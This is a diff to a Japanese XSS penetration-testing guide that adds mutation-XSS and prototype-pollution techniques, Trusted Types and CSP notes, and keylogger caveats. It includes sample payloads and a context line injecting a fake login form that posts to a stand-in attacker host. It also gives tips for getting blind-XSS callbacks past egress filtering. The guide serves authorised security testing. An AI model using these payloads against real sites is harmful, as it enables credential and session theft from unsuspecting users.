@@ -48,7 +48,27 @@ WebアプリケーションのユーザーインターフェースにJavaScript�
 | 反射型（Reflected） | 入力値がそのままレスポンスに反射される | URL パラメータ・検索結果・エラーメッセージ |
 | 格納型（Stored） | 入力値がサーバーに保存され他ユーザーに表示される | コメント欄・メッセージ機能・ユーザープロフィール |
 | DOM型（DOM-based） | クライアントサイドの JS が URL フラグメントを直接 DOM に書き込む | `document.write()` / `innerHTML` の使用箇所 |
+| **mXSS（Mutation XSS）** | サニタイズ後の文字列が `innerHTML` 等に代入された瞬間、ブラウザの HTML パーサが DOM ツリーを構築・修正する過程でサニタイザの検査を抜けたパターンに mutate する | DOMPurify / sanitize-html などのライブラリ + `innerHTML` 代入の組合せ。`<noscript>` / `<template>` / `<math>` / `<svg>` のネスト・属性 quote の引き直し・SVG foreignObject の解釈境界での再パースが典型 mutation 点 |
 | **Blind XSS** | 入力値はその場で反射されないが、後で別のユーザー（管理者等）のブラウザで読まれる | お問い合わせフォーム・サポートチケット・ログ閲覧画面・管理者向けレポート画面 |
+
+**mXSS の確認手順:**
+
+1. 対象がサニタイズライブラリ（DOMPurify 等）を使っているか確認（JS バンドルを grep）
+2. サニタイズ後の文字列が `innerHTML` / `outerHTML` / `document.write()` 経由で DOM に注入されているかを確認（`textContent` ならパースされないので OK）
+3. 上記 2 が揃ったら、Cure53 の mXSS PoC（`<noscript><p title="</noscript><img src=x onerror=alert(1)>">`）のような mutation 系ペイロードを順に試す
+4. DOMPurify の version を確認（`DOMPurify.version`）し、当該 version の既知 mXSS bypass が公開されているか確認
+
+**現代的な DOM XSS の入口（prototype pollution）:**
+
+`__proto__` / `constructor.prototype` 経由でグローバルオブジェクトプロトタイプを汚染し、後段で**ユーザー制御不能と思われていたプロパティが汚染値を返すようになる**ことで XSS sink にたどり着く経路。jQuery `$.extend(true, ...)`・lodash `_.merge` の古いバージョン・自前の deep merge 関数が汚染源として典型。
+
+```js
+// [Attacker] 例: ?__proto__[srcdoc]=<img src=x onerror=alert(1)> 等のクエリで Object.prototype を汚染
+// 後段で iframe を生成する処理が「srcdoc が未指定なら default」というロジックを持っていると
+// プロトタイプ汚染値が iframe.srcdoc に流入して XSS 発火
+```
+
+確認手順は JS バンドルから `$.extend\(.*true` / `_.merge` / 自前 deep merge / `Object.assign({}, ...)` を順に grep して、ユーザー入力が経路に乗っているかを追う。詳細経路は静的解析でも見つかりにくいため、source map がある場合は活用する。
 
 **Blind XSS の発火シグナル：**
 
@@ -270,7 +290,7 @@ document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:
 | フィッシングリダイレクト | `document.location` で偽サイトに転送 | 認証情報窃取 |
 | DOM 偽装（UI 偽装） | DOM 操作でフォームや表示内容を差し替え | ユーザー誘導・認証情報窃取 |
 | CSRF トークン窃取 | ページ内のトークンを読み取り攻撃者に送信 | CSRF 攻撃の補助 |
-| キーロガー | `addEventListener('keydown', ...)` でキー入力を記録 | パスワード・クレジットカード情報窃取 |
+| キーロガー | `addEventListener('keydown', ...)` でキー入力を記録 → 攻撃者ホストへ送信 | パスワード・クレジットカード情報窃取。ただし**ペイロード注入後に被害者がページに留まり続ける必要**があり、SPA でルーティングが切り替わる / 別ページに遷移する / リロードされると失効する。実用化には Stored XSS で**継続的に表示されるページ**（ダッシュボード等）への注入が前提。Reflected XSS では効果が薄い |
 
 ---
 
@@ -288,7 +308,8 @@ document.body.innerHTML='<form action="http://[ATTACKER_HOST]/capture">Username:
 ## 注意点・落とし穴
 
 - **HTTPOnly Cookie が設定されていると `document.cookie` では取得できない**：セッショントークン窃取の代わりに DOM 操作・フィッシングリダイレクト・CSRF を狙う
-- **CSP（Content Security Policy）が有効な場合**：`script-src` の制限で外部スクリプト読み込みが防がれる。CSP ヘッダーの `unsafe-inline` が許可されているかどうかを先に確認する
+- **CSP（Content Security Policy）が有効な場合**：`script-src` の制限で外部スクリプト読み込みが防がれる。CSP ヘッダーの `unsafe-inline` が許可されているかどうかを先に確認する。`nonce-...` / `strict-dynamic` 構成では既存スクリプトの後段から JS を実行する gadget（`<script nonce="...">` の中身を XSS 経由で書き換える経路）が必要
+- **Trusted Types（Chrome / Edge / Firefox 137+）**：`Content-Security-Policy: require-trusted-types-for 'script'` ヘッダがあると、`element.innerHTML = userInput` / `eval(userInput)` 等の DOM XSS sink が **TypeError で実行ブロックされる**（ポリシーで wrap されていない文字列を sink が拒否）。Trusted Types policy が定義されていれば policy 関数を経由した値しか sink に渡せないため、DOM XSS の通常ペイロードは弾かれる。**Trusted Types は HTML / 反射型 / 格納型 XSS には効かない**（サーバ側 HTML 出力に対しては効かない）。CSP report-only モードで配信中の場合は実害は出ないが将来ブロック化される予兆として記録
 - **格納型 XSS は影響範囲が広い**：脆弱なフィールドに保存されたペイロードはそのページを閲覧した全ユーザーに影響する。管理者が閲覧するページに格納できれば高権限への昇格につながる
 - **バイパスは単一手法では不十分なことが多い**：エンコーディング・イベントハンドラ・タグ種類を組み合わせて試す
 - **Blind XSS は callback が来るまで時間がかかる**：管理者の閲覧タイミング依存。複数ペイロードを送る前に十分待つ（数分〜数十分）。受信用ポートは 80/443 に寄せると Egress を通りやすい
